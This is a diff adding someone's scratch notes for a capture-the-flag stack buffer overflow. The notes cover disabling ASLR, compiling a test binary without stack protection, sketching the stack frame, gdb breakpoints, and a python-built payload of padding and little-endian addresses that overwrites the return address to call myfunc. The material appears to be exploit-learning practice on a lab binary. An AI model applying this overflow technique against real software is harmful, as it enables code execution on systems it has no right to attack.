@@ -1,0 +1,45 @@
+sudo sysctl -w kernel.randomize_va_space=0
+sysctl kernel.randomize_va_space=0
+gcc -g ctf.c -o ctf.out -fno-stack-protector -z execstack -mpreferred-stack-boundary=2
+
+
+Stack frame
+
+
+
+buf = 100 === vuln
+ebp
+eip 
+s = 4 byte 
+ebp = 4 => frame point ==== main
+eip = return = 4
+argc = 4
+argv = 4
+=========
+
+gdb ctf.out -q 
+(gdb) disas myfunc
+
+gdb-peda$ disas myfunc
+Dump of assembler code for function myfunc:
+   0x0804851b <+0>:     push   ebp
+
+0x0804851b 
+
+\x1b\x85\x04\x08
+
+b *0x080485dd
+b *0x080485ce
+
+
+
+
+
+p = 4
+q = 4
+============== myfunc
+r $(python -c "print('A'*104+'\x1b\x85\x04\x08'+'\x11\x12\x04\x08'+'\x62\x44\x64\x44')")
+
+x/110xb $esp
+
+./ctf.out $(python -c "print('A'*104+'\x1b\x85\x04\x08'+'\x11\x12\x04\x08'+'\x62\x44\x64\x44')")
